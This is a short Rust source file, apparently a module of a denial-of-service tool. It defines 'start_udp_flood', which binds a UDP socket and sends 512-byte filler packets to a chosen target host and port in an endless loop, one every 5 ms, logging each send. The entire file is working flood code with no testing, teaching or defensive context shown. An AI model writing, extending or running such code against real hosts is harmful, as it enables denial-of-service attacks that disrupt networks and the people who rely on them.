// src/flood/udp.rs
use tokio::net::UdpSocket;
use tokio::time::sleep;
use std::time::Duration;

pub async fn start_udp_flood(target: &str, port: u16) {
    let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap();
    let addr = format!("{}:{}", target, port);

    loop {
        let payload = vec![0x41; 512];
        let _ = socket.send_to(&payload, &addr).await;
        println!("[UDP] Packet sent");
        sleep(Duration::from_millis(5)).await;
    }
}